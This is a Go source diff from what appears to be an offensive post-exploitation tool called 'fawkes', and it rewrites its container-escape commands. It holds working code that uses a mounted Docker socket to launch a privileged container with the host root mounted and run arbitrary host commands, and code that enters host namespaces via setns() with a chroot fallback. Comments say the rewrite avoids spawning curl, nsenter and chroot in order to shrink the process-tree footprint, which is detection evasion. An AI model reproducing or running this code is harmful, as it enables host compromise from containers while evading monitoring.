@@ -3,13 +3,22 @@
 package commands
 
 import (
+	"bytes"
+	"context"
 	"encoding/json"
 	"fmt"
+	"io"
+	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"syscall"
+	"time"
+
+	"golang.org/x/sys/unix"
 
 	"fawkes/pkg/structs"
 )
@@ -94,16 +103,11 @@ func escapeCheck() (string, string) {
 	// 2. Privileged container (all capabilities + no seccomp)
 	privileged := false
 	if data, err := os.ReadFile("/proc/self/status"); err == nil {
-		for _, line := range strings.Split(string(data), "\n") {
-			if strings.HasPrefix(line, "CapEff:") {
-				cap := strings.TrimSpace(strings.TrimPrefix(line, "CapEff:"))
-				// Full caps = likely privileged
-				if cap == "0000003fffffffff" || cap == "000001ffffffffff" || cap == "000003ffffffffff" {
-					sb.WriteString("[!] Full capabilities detected — likely PRIVILEGED container\n")
-					privileged = true
-					vectors++
-				}
-			}
+		capEff := parseCapEff(string(data))
+		if isFullCaps(capEff) {
+			sb.WriteString("[!] Full capabilities detected — likely PRIVILEGED container\n")
+			privileged = true
+			vectors++
 		}
 	}
 
@@ -194,7 +198,58 @@ func escapeCheck() (string, string) {
 	return sb.String(), "success"
 }
 
+// dockerUnixClient creates an HTTP client that communicates via a Unix socket.
+// This avoids spawning curl for Docker API communication.
+func dockerUnixClient(sockPath string) *http.Client {
+	return &http.Client{
+		Transport: &http.Transport{
+			DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
+				return net.DialTimeout("unix", sockPath, 10*time.Second)
+			},
+		},
+		Timeout: 60 * time.Second,
+	}
+}
+
+// dockerAPIPost sends a POST request to the Docker API via Unix socket.
+func dockerAPIPost(client *http.Client, path string, body []byte) ([]byte, error) {
+	var bodyReader io.Reader
+	if body != nil {
+		bodyReader = bytes.NewReader(body)
+	}
+	resp, err := client.Post("http://docker"+path, "application/json", bodyReader)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	return io.ReadAll(resp.Body)
+}
+
+// dockerAPIGet sends a GET request to the Docker API via Unix socket.
+func dockerAPIGet(client *http.Client, path string) ([]byte, error) {
+	resp, err := client.Get("http://docker" + path)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	return io.ReadAll(resp.Body)
+}
+
+// dockerAPIDelete sends a DELETE request to the Docker API via Unix socket.
+func dockerAPIDelete(client *http.Client, path string) {
+	req, err := http.NewRequest("DELETE", "http://docker"+path, nil)
+	if err != nil {
+		return
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	resp.Body.Close()
+}
+
 // escapeDockerSock exploits a mounted Docker socket to run a command on the host.
+// Uses native Go HTTP over Unix socket — zero child process spawns.
 func escapeDockerSock(command, image string) (string, string) {
 	if command == "" {
 		return "Required: -command '<host command to run>'", "error"
@@ -220,19 +275,15 @@ func escapeDockerSock(command, image string) (string, string) {
 	sb.WriteString(fmt.Sprintf("[*] Image: %s\n", image))
 	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", command))
 
-	// Use curl to communicate with Docker API via Unix socket
-	// Create a container with host mount and run the command
+	client := dockerUnixClient(sockPath)
+
+	// Create container with host mount and run the command
 	createJSON := fmt.Sprintf(`{"Image":"%s","Cmd":["/bin/sh","-c","%s"],"HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}`,
 		image, strings.ReplaceAll(command, `"`, `\"`))
 
-	// Create container
-	out, err := exec.Command("curl", "-s", "--unix-socket", sockPath,
-		"-X", "POST",
-		"-H", "Content-Type: application/json",
-		"-d", createJSON,
-		"http://localhost/containers/create").CombinedOutput()
+	out, err := dockerAPIPost(client, "/containers/create", []byte(createJSON))
 	if err != nil {
-		return fmt.Sprintf("Failed to create container: %v\n%s", err, string(out)), "error"
+		return fmt.Sprintf("Failed to create container: %v", err), "error"
 	}
 
 	// Parse container ID
@@ -246,29 +297,24 @@ func escapeDockerSock(command, image string) (string, string) {
 	sb.WriteString(fmt.Sprintf("[+] Container created: %s\n", containerID))
 
 	// Start container
-	if _, err = exec.Command("curl", "-s", "--unix-socket", sockPath,
-		"-X", "POST",
-		fmt.Sprintf("http://localhost/containers/%s/start", containerID)).CombinedOutput(); err != nil {
+	if _, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/start", containerID), nil); err != nil {
 		sb.WriteString(fmt.Sprintf("[!] Failed to start container: %v\n", err))
 		return sb.String(), "error"
 	}
 	sb.WriteString("[+] Container started\n")
 
-	// Wait for completion and get logs
-	_, _ = exec.Command("curl", "-s", "--unix-socket", sockPath,
-		fmt.Sprintf("http://localhost/containers/%s/wait", containerID)).CombinedOutput()
+	// Wait for completion (ignore error — we'll get logs regardless)
+	_, _ = dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil)
 
-	logs, _ := exec.Command("curl", "-s", "--unix-socket", sockPath,
-		fmt.Sprintf("http://localhost/containers/%s/logs?stdout=true&stderr=true", containerID)).CombinedOutput()
+	// Get logs
+	logs, _ := dockerAPIGet(client, fmt.Sprintf("/containers/%s/logs?stdout=true&stderr=true", containerID))
 
 	sb.WriteString("\n--- Output ---\n")
 	// Docker logs have 8-byte header per line; strip it
 	sb.WriteString(cleanDockerLogs(string(logs)))
 
 	// Cleanup: remove container
-	_, _ = exec.Command("curl", "-s", "--unix-socket", sockPath,
-		"-X", "DELETE",
-		fmt.Sprintf("http://localhost/containers/%s?force=true", containerID)).CombinedOutput()
+	dockerAPIDelete(client, fmt.Sprintf("/containers/%s?force=true", containerID))
 	sb.WriteString("\n[+] Container removed\n")
 
 	return sb.String(), "success"
@@ -405,7 +451,25 @@ func escapeCgroupNotify(command string) (string, string) {
 	return sb.String(), "success"
 }
 
-// escapeNsenter enters the host PID namespace to run a command.
+// nsNamespace maps namespace names to their clone flags for setns().
+type nsNamespace struct {
+	name string
+	flag int
+}
+
+// hostNamespaces are the Linux namespaces to enter for full host context.
+var hostNamespaces = []nsNamespace{
+	{"mnt", unix.CLONE_NEWNS},
+	{"uts", unix.CLONE_NEWUTS},
+	{"ipc", unix.CLONE_NEWIPC},
+	{"net", unix.CLONE_NEWNET},
+	// PID namespace change only affects children, not current process
+	{"pid", unix.CLONE_NEWPID},
+}
+
+// escapeNsenter enters the host namespaces to run a command.
+// Uses direct setns() syscalls instead of spawning nsenter/chroot binaries,
+// reducing the process tree footprint to just /bin/sh.
 func escapeNsenter(command string) (string, string) {
 	if command == "" {
 		return "Required: -command '<host command to run>'", "error"
@@ -424,22 +488,86 @@ func escapeNsenter(command string) (string, string) {
 		return fmt.Sprintf("PID namespaces differ (self=%s, host=%s) — nsenter not available", selfNS, hostNS), "error"
 	}
 
-	// Use nsenter to enter all host namespaces
-	out, err := exec.Command("nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid",
-		"--", "/bin/sh", "-c", command).CombinedOutput()
-	if err != nil {
-		// nsenter might not be available, try via /proc/1/root
-		if _, statErr := os.Stat("/proc/1/root"); statErr == nil {
-			out, err = exec.Command("chroot", "/proc/1/root", "/bin/sh", "-c", command).CombinedOutput()
-			if err != nil {
-				return fmt.Sprintf("Both nsenter and chroot failed: %v\n%s", err, string(out)), "error"
-			}
-			return fmt.Sprintf("[+] Executed via chroot /proc/1/root\n\n--- Output ---\n%s", string(out)), "success"
-		}
-		return fmt.Sprintf("nsenter failed: %v\n%s", err, string(out)), "error"
+	// Try setns approach first (enters host namespaces directly via syscall)
+	output, status := nsenterViaSetns(command)
+	if status == "success" {
+		return output, status
 	}
 
-	return fmt.Sprintf("[+] Executed via nsenter\n\n--- Output ---\n%s", string(out)), "success"
+	// Fallback: use SysProcAttr.Chroot to chroot into /proc/1/root
+	// This avoids spawning the chroot binary — Go handles it internally
+	if _, err := os.Stat("/proc/1/root"); err == nil {
+		cmd := exec.Command("/proc/1/root/bin/sh", "-c", command)
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			Chroot: "/proc/1/root",
+		}
+		cmd.Dir = "/"
+		out, err := cmd.CombinedOutput()
+		if err != nil {
+			return fmt.Sprintf("setns failed (%s), chroot fallback also failed: %v\n%s", output, err, string(out)), "error"
+		}
+		return fmt.Sprintf("[+] Executed via chroot /proc/1/root (syscall, no chroot binary)\n\n--- Output ---\n%s", string(out)), "success"
+	}
+
+	return fmt.Sprintf("Both setns and chroot approaches failed: %s", output), "error"
+}
+
+// nsenterViaSetns enters host namespaces using direct setns() syscalls and runs
+// the command. The goroutine is pinned to its OS thread to ensure namespace
+// changes are consistent, and original namespaces are restored afterward.
+func nsenterViaSetns(command string) (string, string) {
+	// Pin this goroutine to a single OS thread — namespace operations are per-thread
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
+	// Save original namespace FDs so we can restore after the command
+	origFDs := make(map[string]int)
+	for _, ns := range hostNamespaces {
+		fd, err := unix.Open(fmt.Sprintf("/proc/self/ns/%s", ns.name), unix.O_RDONLY, 0)
+		if err == nil {
+			origFDs[ns.name] = fd
+		}
+	}
+	defer func() {
+		// Restore original namespaces (best-effort — failure here means
+		// the thread stays in host namespaces, but LockOSThread prevents
+		// that from affecting other goroutines)
+		for _, ns := range hostNamespaces {
+			if fd, ok := origFDs[ns.name]; ok {
+				_ = unix.Setns(fd, ns.flag)
+				unix.Close(fd)
+			}
+		}
+	}()
+
+	// Enter host namespaces via setns()
+	entered := 0
+	for _, ns := range hostNamespaces {
+		hostPath := fmt.Sprintf("/proc/1/ns/%s", ns.name)
+		fd, err := unix.Open(hostPath, unix.O_RDONLY, 0)
+		if err != nil {
+			continue
+		}
+		if err := unix.Setns(fd, ns.flag); err != nil {
+			unix.Close(fd)
+			continue
+		}
+		unix.Close(fd)
+		entered++
+	}
+
+	if entered == 0 {
+		return "setns: could not enter any host namespaces", "error"
+	}
+
+	// Run command — child process inherits our (now host) namespaces
+	cmd := exec.Command("/bin/sh", "-c", command)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("setns succeeded (%d namespaces) but command failed: %v\n%s", entered, err, string(out)), "error"
+	}
+
+	return fmt.Sprintf("[+] Executed via setns (%d host namespaces entered, no nsenter binary)\n\n--- Output ---\n%s", entered, string(out)), "success"
 }
 
 // escapeMountHost mounts a host block device to access the host filesystem.
@@ -509,26 +637,4 @@ func escapeMountHost(devicePath string) (string, string) {
 	return sb.String(), "success"
 }
 
-// extractCgroupPath gets the container's cgroup path from /proc/1/cgroup.
-func extractCgroupPath(content string) string {
-	for _, line := range strings.Split(content, "\n") {
-		parts := strings.SplitN(line, ":", 3)
-		if len(parts) == 3 && parts[2] != "/" && parts[2] != "" {
-			return parts[2]
-		}
-	}
-	return ""
-}
-
-// cleanDockerLogs strips the 8-byte Docker log header from each line.
-func cleanDockerLogs(raw string) string {
-	var sb strings.Builder
-	for _, line := range strings.Split(raw, "\n") {
-		if len(line) > 8 {
-			sb.WriteString(line[8:] + "\n")
-		} else if line != "" {
-			sb.WriteString(line + "\n")
-		}
-	}
-	return sb.String()
-}
+// extractCgroupPath, cleanDockerLogs moved to container_escape_helpers.go
